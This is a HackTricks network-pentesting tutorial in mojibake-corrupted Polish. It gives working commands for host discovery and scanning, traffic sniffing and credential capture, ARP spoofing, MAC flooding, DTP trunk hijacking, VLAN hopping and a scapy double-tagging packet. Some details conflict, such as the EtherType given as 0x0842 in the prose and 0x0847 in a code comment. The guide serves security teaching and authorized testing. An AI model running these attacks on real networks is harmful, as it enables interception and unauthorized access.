# Pentesting Network

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na githubie.

</details>
{% endhint %}

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Tip dotyczÄ…cy bug bounty**: **zarejestruj siÄ™** w **Intigriti**, premium **platformie bug bounty stworzonej przez hackerÃ³w, dla hackerÃ³w**! DoÅ‚Ä…cz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) juÅ¼ dziÅ› i zacznij zarabiaÄ‡ nagrody do **100 000 USD**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Odkrywanie hostÃ³w z zewnÄ…trz

To bÄ™dzie **krÃ³tkÄ… sekcjÄ…** na temat tego, jak znaleÅºÄ‡ **IP odpowiadajÄ…ce** z **Internetu**.\
W tej sytuacji masz pewien **zakres IP** (moÅ¼e nawet kilka **zakresÃ³w**) i musisz tylko znaleÅºÄ‡ **ktÃ³re IP odpowiadajÄ…**.

### ICMP

To jest **najÅ‚atwiejszy** i **najszybszy** sposÃ³b, aby odkryÄ‡, czy host jest aktywny, czy nie.\
MoÅ¼esz sprÃ³bowaÄ‡ wysÅ‚aÄ‡ kilka **pakietÃ³w ICMP** i **oczekiwaÄ‡ odpowiedzi**. NajÅ‚atwiejszym sposobem jest po prostu wysÅ‚anie **Å¼Ä…dania echo** i oczekiwanie na odpowiedÅº. MoÅ¼esz to zrobiÄ‡, uÅ¼ywajÄ…c prostego `ping` lub uÅ¼ywajÄ…c `fping` dla **zakresÃ³w**.\
MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ **nmap**, aby wysÅ‚aÄ‡ inne typy pakietÃ³w ICMP (to pomoÅ¼e uniknÄ…Ä‡ filtrÃ³w dla powszechnych Å¼Ä…daÅ„-odpowiedzi ICMP echo).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### Odkrywanie portÃ³w TCP

Bardzo czÄ™sto moÅ¼na zauwaÅ¼yÄ‡, Å¼e wszystkie rodzaje pakietÃ³w ICMP sÄ… filtrowane. Wtedy jedyne, co moÅ¼esz zrobiÄ‡, aby sprawdziÄ‡, czy host jest aktywny, to **sprÃ³bowaÄ‡ znaleÅºÄ‡ otwarte porty**. KaÅ¼dy host ma **65535 portÃ³w**, wiÄ™c jeÅ›li masz "duÅ¼y" zakres, **nie moÅ¼esz** sprawdziÄ‡, czy **kaÅ¼dy port** kaÅ¼dego hosta jest otwarty, zajmie to zbyt duÅ¼o czasu.\
Wtedy potrzebujesz **szybkiego skanera portÃ³w** ([masscan](https://github.com/robertdavidgraham/masscan)) i listy **najczÄ™Å›ciej uÅ¼ywanych portÃ³w:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
MoÅ¼esz rÃ³wnieÅ¼ wykonaÄ‡ ten krok za pomocÄ… `nmap`, ale jest to wolniejsze i `nmap` ma problemy z identyfikowaniem aktywnych hostÃ³w.

### Odkrywanie portu HTTP

To jest po prostu odkrywanie portÃ³w TCP, przydatne, gdy chcesz **skupiÄ‡ siÄ™ na odkrywaniu usÅ‚ug HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### Odkrywanie portÃ³w UDP

MoÅ¼esz rÃ³wnieÅ¼ sprÃ³bowaÄ‡ sprawdziÄ‡, czy jakiÅ› **port UDP jest otwarty**, aby zdecydowaÄ‡, czy powinieneÅ› **zwrÃ³ciÄ‡ wiÄ™kszÄ… uwagÄ™** na **hosta.** PoniewaÅ¼ usÅ‚ugi UDP zazwyczaj **nie odpowiadajÄ…** **Å¼adnymi danymi** na standardowy pusty pakiet probe UDP, trudno jest stwierdziÄ‡, czy port jest filtrowany, czy otwarty. NajÅ‚atwiejszym sposobem na podjÄ™cie decyzji jest wysÅ‚anie pakietu zwiÄ…zanego z dziaÅ‚ajÄ…cÄ… usÅ‚ugÄ…, a poniewaÅ¼ nie wiesz, ktÃ³ra usÅ‚uga dziaÅ‚a, powinieneÅ› sprÃ³bowaÄ‡ najbardziej prawdopodobnych na podstawie numeru portu:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Linia nmap zaproponowana wczeÅ›niej przetestuje **najlepsze 1000 portÃ³w UDP** w kaÅ¼dym hoÅ›cie w zakresie **/24**, ale nawet to zajmie **>20min**. JeÅ›li potrzebujesz **najszybszych wynikÃ³w**, moÅ¼esz uÅ¼yÄ‡ [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` To wyÅ›le te **proby UDP** do ich **oczekiwanego portu** (dla zakresu /24 zajmie to tylko 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### Odkrywanie portÃ³w SCTP
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Tutaj znajdziesz Å‚adny przewodnik po wszystkich znanych atakach Wifi w momencie pisania:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Odkrywanie hostÃ³w od wewnÄ…trz

JeÅ›li jesteÅ› wewnÄ…trz sieci, jednÄ… z pierwszych rzeczy, ktÃ³re chcesz zrobiÄ‡, jest **odkrycie innych hostÃ³w**. W zaleÅ¼noÅ›ci od **tego, ile haÅ‚asu** moÅ¼esz/chcesz zrobiÄ‡, moÅ¼na wykonaÄ‡ rÃ³Å¼ne dziaÅ‚ania:

### Pasywne

MoÅ¼esz uÅ¼yÄ‡ tych narzÄ™dzi do pasywnego odkrywania hostÃ³w w podÅ‚Ä…czonej sieci:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktywne

ZauwaÅ¼, Å¼e techniki omÃ³wione w [_**Odkrywaniu hostÃ³w z zewnÄ…trz**_](./#discovering-hosts-from-the-outside) (_Odkrywanie portÃ³w TCP/HTTP/UDP/SCTP_) mogÄ… byÄ‡ rÃ³wnieÅ¼ **zastosowane tutaj**.\
Jednak, poniewaÅ¼ jesteÅ› w **tej samej sieci** co inne hosty, moÅ¼esz zrobiÄ‡ **wiÄ™cej rzeczy**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

ZauwaÅ¼, Å¼e techniki omÃ³wione w _Odkrywaniu hostÃ³w z zewnÄ…trz_ ([_**ICMP**_](./#icmp)) mogÄ… byÄ‡ rÃ³wnieÅ¼ **zastosowane tutaj**.\
Jednak, poniewaÅ¼ jesteÅ› w **tej samej sieci** co inne hosty, moÅ¼esz zrobiÄ‡ **wiÄ™cej rzeczy**:

* JeÅ›li **pingujesz** **adres rozgÅ‚oszeniowy podsieci**, ping powinien dotrzeÄ‡ do **kaÅ¼dego hosta** i mogÄ… oni **odpowiedzieÄ‡** **tobie**: `ping -b 10.10.5.255`
* PingujÄ…c **adres rozgÅ‚oszeniowy sieci**, moÅ¼esz nawet znaleÅºÄ‡ hosty w **innych podsieciach**: `ping -b 255.255.255.255`
* UÅ¼yj flag `-PE`, `-PP`, `-PM` w `nmap`, aby przeprowadziÄ‡ odkrywanie hostÃ³w, wysyÅ‚ajÄ…c odpowiednio **Å¼Ä…dania ICMPv4 echo**, **znacznika czasu** i **maski podsieci:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan jest uÅ¼ywane do **wÅ‚Ä…czania** komputerÃ³w za pomocÄ… **wiadomoÅ›ci sieciowej**. Magiczny pakiet uÅ¼ywany do wÅ‚Ä…czenia komputera to tylko pakiet, w ktÃ³rym podany jest **MAC Dst**, a nastÄ™pnie jest **powtarzany 16 razy** w tym samym pakiecie.\
Takie pakiety sÄ… zazwyczaj wysyÅ‚ane w **ethernet 0x0842** lub w **pakiecie UDP na port 9**.\
JeÅ›li **Å¼aden \[MAC]** nie jest podany, pakiet jest wysyÅ‚any do **rozgÅ‚oszenia ethernet** (a rozgÅ‚oszeniowy MAC bÄ™dzie tym, ktÃ³ry jest powtarzany).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Skanning hostÃ³w

Gdy odkryjesz wszystkie IP (zewnÄ™trzne lub wewnÄ™trzne), ktÃ³re chcesz dokÅ‚adnie zeskanowaÄ‡, moÅ¼na wykonaÄ‡ rÃ³Å¼ne dziaÅ‚ania.

### TCP

* **Otwarty** port: _SYN --> SYN/ACK --> RST_
* **ZamkniÄ™ty** port: _SYN --> RST/ACK_
* **Filtrowany** port: _SYN --> \[BRAK ODPOWIEDZI]_
* **Filtrowany** port: _SYN --> komunikat ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

IstniejÄ… 2 opcje skanowania portu UDP:

* WyÅ›lij **pakiet UDP** i sprawdÅº odpowiedÅº _**ICMP unreachable**_, jeÅ›li port jest **zamkniÄ™ty** (w wielu przypadkach ICMP bÄ™dzie **filtrowany**, wiÄ™c nie otrzymasz Å¼adnych informacji, czy port jest zamkniÄ™ty, czy otwarty).
* WyÅ›lij **sformatowane datagramy**, aby wywoÅ‚aÄ‡ odpowiedÅº od **usÅ‚ugi** (np. DNS, DHCP, TFTP i inne, jak wymieniono w _nmap-payloads_). JeÅ›li otrzymasz **odpowiedÅº**, to port jest **otwarty**.

**Nmap** bÄ™dzie **mieszaÅ‚ obie** opcje, uÅ¼ywajÄ…c "-sV" (skanowanie UDP jest bardzo wolne), ale zauwaÅ¼, Å¼e skanowanie UDP jest wolniejsze niÅ¼ skanowanie TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** jest zaprojektowany do uÅ¼ycia obok **TCP (Transmission Control Protocol)** i **UDP (User Datagram Protocol)**. Jego gÅ‚Ã³wnym celem jest uÅ‚atwienie transportu danych telekomunikacyjnych przez sieci IP, odzwierciedlajÄ…c wiele funkcji niezawodnoÅ›ciowych wystÄ™pujÄ…cych w **Signaling System 7 (SS7)**. **SCTP** jest kluczowym elementem rodziny protokoÅ‚Ã³w **SIGTRAN**, ktÃ³ra ma na celu transport sygnaÅ‚Ã³w SS7 przez sieci IP.

Wsparcie dla **SCTP** jest zapewniane przez rÃ³Å¼ne systemy operacyjne, takie jak **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** i **VxWorks**, co wskazuje na jego szerokÄ… akceptacjÄ™ i uÅ¼ytecznoÅ›Ä‡ w dziedzinie telekomunikacji i sieci.

Dwa rÃ³Å¼ne skany dla SCTP sÄ… oferowane przez nmap: _-sY_ i _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS i IPS omijanie

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **WiÄ™cej opcji nmap**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Ujawnianie wewnÄ™trznych adresÃ³w IP

**Å¹le skonfigurowane routery, zapory ogniowe i urzÄ…dzenia sieciowe** czasami odpowiadajÄ… na prÃ³by sieciowe, uÅ¼ywajÄ…c **adresÃ³w ÅºrÃ³dÅ‚owych niepublicznych**. **tcpdump** moÅ¼e byÄ‡ wykorzystany do identyfikacji pakietÃ³w otrzymanych z prywatnych adresÃ³w podczas testowania. Konkretnie, na Kali Linux, pakiety mogÄ… byÄ‡ przechwytywane na **interfejsie eth2**, ktÃ³ry jest dostÄ™pny z publicznego Internetu. WaÅ¼ne jest, aby zauwaÅ¼yÄ‡, Å¼e jeÅ›li twoja konfiguracja znajduje siÄ™ za NAT lub zaporÄ… ogniowÄ…, takie pakiety prawdopodobnie bÄ™dÄ… filtrowane.
```bash
tcpdump â€“nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing moÅ¼esz poznaÄ‡ szczegÃ³Å‚y zakresÃ³w IP, rozmiarÃ³w podsieci, adresÃ³w MAC i nazw hostÃ³w, przeglÄ…dajÄ…c przechwycone ramki i pakiety. JeÅ›li sieÄ‡ jest Åºle skonfigurowana lub fabric przeÅ‚Ä…czania jest obciÄ…Å¼ona, atakujÄ…cy mogÄ… przechwyciÄ‡ wraÅ¼liwe materiaÅ‚y za pomocÄ… pasywnego sniffingu sieciowego.

JeÅ›li sieÄ‡ Ethernet z przeÅ‚Ä…cznikami jest poprawnie skonfigurowana, zobaczysz tylko ramki rozgÅ‚oszeniowe i materiaÅ‚y przeznaczone dla twojego adresu MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
MoÅ¼na rÃ³wnieÅ¼ przechwytywaÄ‡ pakiety z zdalnej maszyny przez sesjÄ™ SSH z Wireshark jako interfejsem graficznym w czasie rzeczywistym.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

OczywiÅ›cie.

### Capturing credentials

MoÅ¼esz uÅ¼yÄ‡ narzÄ™dzi takich jak [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz), aby analizowaÄ‡ dane uwierzytelniajÄ…ce z pliku pcap lub z aktywnego interfejsu.

## LAN attacks

### ARP spoofing

ARP Spoofing polega na wysyÅ‚aniu niepotrzebnych odpowiedzi ARP, aby wskazaÄ‡, Å¼e IP maszyny ma MAC naszego urzÄ…dzenia. Wtedy ofiara zmieni tabelÄ™ ARP i skontaktuje siÄ™ z naszÄ… maszynÄ… za kaÅ¼dym razem, gdy bÄ™dzie chciaÅ‚a skontaktowaÄ‡ siÄ™ z IP, ktÃ³re zostaÅ‚o sfaÅ‚szowane.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

PrzepeÅ‚nienie tabeli CAM przeÅ‚Ä…cznika, wysyÅ‚ajÄ…c wiele pakietÃ³w z rÃ³Å¼nymi adresami MAC ÅºrÃ³dÅ‚owymi. Gdy tabela CAM jest peÅ‚na, przeÅ‚Ä…cznik zaczyna zachowywaÄ‡ siÄ™ jak hub (broadcastujÄ…c caÅ‚y ruch).
```bash
macof -i <interface>
```
W nowoczesnych przeÅ‚Ä…cznikach ta podatnoÅ›Ä‡ zostaÅ‚a naprawiona.

### Ataki 802.1Q VLAN / DTP

#### Dynamiczne trunkowanie

**Dynamic Trunking Protocol (DTP)** jest zaprojektowany jako protokÃ³Å‚ warstwy Å‚Ä…cza, aby uÅ‚atwiÄ‡ automatyczny system trunkowania, pozwalajÄ…c przeÅ‚Ä…cznikom na automatyczny wybÃ³r portÃ³w do trybu trunk (Trunk) lub trybu nie-trunk. WdroÅ¼enie **DTP** czÄ™sto postrzegane jest jako wskaÅºnik suboptymalnego projektowania sieci, podkreÅ›lajÄ…c znaczenie rÄ™cznej konfiguracji trunkÃ³w tylko tam, gdzie to konieczne, oraz zapewnienia odpowiedniej dokumentacji.

DomyÅ›lnie porty przeÅ‚Ä…cznika sÄ… ustawione na tryb Dynamic Auto, co oznacza, Å¼e sÄ… gotowe do inicjowania trunkowania, jeÅ›li zostanÄ… o to poproszone przez sÄ…siedni przeÅ‚Ä…cznik. Problem bezpieczeÅ„stwa pojawia siÄ™, gdy pentester lub atakujÄ…cy Å‚Ä…czy siÄ™ z przeÅ‚Ä…cznikiem i wysyÅ‚a ramkÄ™ DTP Desirable, zmuszajÄ…c port do przejÅ›cia w tryb trunk. DziaÅ‚anie to umoÅ¼liwia atakujÄ…cemu enumeracjÄ™ VLAN-Ã³w poprzez analizÄ™ ramek STP i obejÅ›cie segmentacji VLAN, tworzÄ…c wirtualne interfejsy.

ObecnoÅ›Ä‡ DTP w wielu przeÅ‚Ä…cznikach domyÅ›lnie moÅ¼e byÄ‡ wykorzystywana przez przeciwnikÃ³w do naÅ›ladowania zachowania przeÅ‚Ä…cznika, co pozwala na dostÄ™p do ruchu we wszystkich VLAN-ach. Skrypt [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) jest wykorzystywany do monitorowania interfejsu, ujawniajÄ…c, czy przeÅ‚Ä…cznik jest w trybie Default, Trunk, Dynamic, Auto lub Accessâ€”ten ostatni jest jedynÄ… konfiguracjÄ… odpornÄ… na ataki VLAN hopping. To narzÄ™dzie ocenia status podatnoÅ›ci przeÅ‚Ä…cznika.

JeÅ›li zostanie zidentyfikowana podatnoÅ›Ä‡ sieci, narzÄ™dzie _**Yersinia**_ moÅ¼e byÄ‡ uÅ¼yte do "wÅ‚Ä…czenia trunkowania" za pomocÄ… protokoÅ‚u DTP, co pozwala na obserwacjÄ™ pakietÃ³w ze wszystkich VLAN-Ã³w.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (269).png>)

Aby enumerowaÄ‡ VLAN-y, moÅ¼na rÃ³wnieÅ¼ wygenerowaÄ‡ ramkÄ™ DTP Desirable za pomocÄ… skryptu [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. N**ie przerywaj skryptu pod Å¼adnym pozorem. Wstrzykuje DTP Desirable co trzy sekundy. **Dynamically created trunk channels on the switch only live for five minutes. After five minutes, the trunk falls off.**
```
sudo python3 DTPHijacking.py --interface eth0
```
ChciaÅ‚bym zwrÃ³ciÄ‡ uwagÄ™, Å¼e **Access/Desirable (0x03)** wskazuje, Å¼e ramka DTP jest typu Desirable, co nakazuje portowi przeÅ‚Ä…czenie siÄ™ w tryb Trunk. A **802.1Q/802.1Q (0xa5)** wskazuje typ enkapsulacji **802.1Q**.

AnalizujÄ…c ramki STP, **dowiadujemy siÄ™ o istnieniu VLAN 30 i VLAN 60.**

<figure><img src="../../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

#### Atakowanie konkretnych VLAN-Ã³w

Gdy znasz identyfikatory VLAN i wartoÅ›ci IP, moÅ¼esz **skonfigurowaÄ‡ interfejs wirtualny, aby zaatakowaÄ‡ konkretny VLAN**.\
JeÅ›li DHCP nie jest dostÄ™pne, uÅ¼yj _ifconfig_, aby ustawiÄ‡ statyczny adres IP.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

Atak omÃ³wiony w **Dynamic Trunking i tworzeniu wirtualnych interfejsÃ³w oraz odkrywaniu hostÃ³w wewnÄ…trz** innych VLANÃ³w jest **automatycznie wykonywany** przez narzÄ™dzie: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

JeÅ›li atakujÄ…cy zna wartoÅ›Ä‡ **MAC, IP i VLAN ID ofiary**, moÅ¼e sprÃ³bowaÄ‡ **podwÃ³jnie oznaczyÄ‡ ramkÄ™** jej przypisanym VLANem oraz VLANem ofiary i wysÅ‚aÄ‡ pakiet. PoniewaÅ¼ **ofiara nie bÄ™dzie mogÅ‚a poÅ‚Ä…czyÄ‡ siÄ™ z powrotem** z atakujÄ…cym, **najlepszÄ… opcjÄ… dla atakujÄ…cego jest komunikacja za pomocÄ… UDP** do protokoÅ‚Ã³w, ktÃ³re mogÄ… wykonaÄ‡ interesujÄ…ce akcje (jak SNMP).

InnÄ… opcjÄ… dla atakujÄ…cego jest przeprowadzenie **skanowania portÃ³w TCP, podszywajÄ…c siÄ™ pod IP kontrolowane przez atakujÄ…cego i dostÄ™pne przez ofiarÄ™** (prawdopodobnie przez internet). NastÄ™pnie atakujÄ…cy mÃ³gÅ‚by sniffowaÄ‡ na drugim hoÅ›cie, ktÃ³ry mu naleÅ¼y, jeÅ›li otrzyma jakieÅ› pakiety od ofiary.

![](<../../.gitbook/assets/image (190).png>)

Aby przeprowadziÄ‡ ten atak, moÅ¼esz uÅ¼yÄ‡ scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

JeÅ›li masz **dostÄ™p do switcha, do ktÃ³rego jesteÅ› bezpoÅ›rednio podÅ‚Ä…czony**, masz moÅ¼liwoÅ›Ä‡ **obejÅ›cia segmentacji VLAN** w sieci. Po prostu **przeÅ‚Ä…cz port w tryb trunk** (znany rÃ³wnieÅ¼ jako trunk), utwÃ³rz wirtualne interfejsy z identyfikatorami docelowych VLAN-Ã³w i skonfiguruj adres IP. MoÅ¼esz sprÃ³bowaÄ‡ zaÅ¼Ä…daÄ‡ adresu dynamicznie (DHCP) lub skonfigurowaÄ‡ go statycznie. To zaleÅ¼y od przypadku.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Layer 3 Private VLAN Bypass

W niektÃ³rych Å›rodowiskach, takich jak sieci bezprzewodowe dla goÅ›ci, wprowadza siÄ™ ustawienia **izolacji portÃ³w (znane rÃ³wnieÅ¼ jako prywatne VLAN)**, aby zapobiec bezpoÅ›redniej komunikacji miÄ™dzy klientami podÅ‚Ä…czonymi do punktu dostÄ™powego. Jednak zidentyfikowano technikÄ™, ktÃ³ra moÅ¼e obejÅ›Ä‡ te Å›rodki izolacji. Technika ta wykorzystuje brak ACL w sieci lub ich niewÅ‚aÅ›ciwÄ… konfiguracjÄ™, umoÅ¼liwiajÄ…c pakietom IP przechodzenie przez router, aby dotrzeÄ‡ do innego klienta w tej samej sieci.

Atak jest realizowany poprzez stworzenie **pakietu, ktÃ³ry zawiera adres IP docelowego klienta, ale z adresem MAC routera**. To powoduje, Å¼e router bÅ‚Ä™dnie przekazuje pakiet do docelowego klienta. To podejÅ›cie jest podobne do tego stosowanego w atakach Double Tagging, gdzie moÅ¼liwoÅ›Ä‡ kontrolowania hosta dostÄ™pnego dla ofiary jest wykorzystywana do wykorzystania luki w zabezpieczeniach.

**Kluczowe kroki ataku:**

1. **Tworzenie pakietu:** Pakiet jest specjalnie tworzony, aby zawieraÅ‚ adres IP docelowego klienta, ale z adresem MAC routera.
2. **Wykorzystywanie zachowania routera:** Stworzony pakiet jest wysyÅ‚any do routera, ktÃ³ry, z powodu konfiguracji, przekierowuje pakiet do docelowego klienta, omijajÄ…c izolacjÄ™ zapewnianÄ… przez ustawienia prywatnego VLAN.

### VTP Attacks

VTP (VLAN Trunking Protocol) centralizuje zarzÄ…dzanie VLAN. Wykorzystuje numery rewizji do utrzymania integralnoÅ›ci bazy danych VLAN; kaÅ¼da modyfikacja zwiÄ™ksza ten numer. Switche przyjmujÄ… konfiguracje z wyÅ¼szymi numerami rewizji, aktualizujÄ…c swoje wÅ‚asne bazy danych VLAN.

#### VTP Domain Roles

* **VTP Server:** ZarzÄ…dza VLAN-amiâ€”tworzy, usuwa, modyfikuje. RozsyÅ‚a ogÅ‚oszenia VTP do czÅ‚onkÃ³w domeny.
* **VTP Client:** Odbiera ogÅ‚oszenia VTP, aby zsynchronizowaÄ‡ swojÄ… bazÄ™ danych VLAN. Ta rola jest ograniczona w zakresie lokalnych modyfikacji konfiguracji VLAN.
* **VTP Transparent:** Nie angaÅ¼uje siÄ™ w aktualizacje VTP, ale przekazuje ogÅ‚oszenia VTP. Nie jest podatny na ataki VTP, utrzymuje staÅ‚y numer rewizji rÃ³wny zero.

#### VTP Advertisement Types

* **Summary Advertisement:** RozsyÅ‚ane przez serwer VTP co 300 sekund, zawiera istotne informacje o domenie.
* **Subset Advertisement:** WysyÅ‚ane po zmianach konfiguracji VLAN.
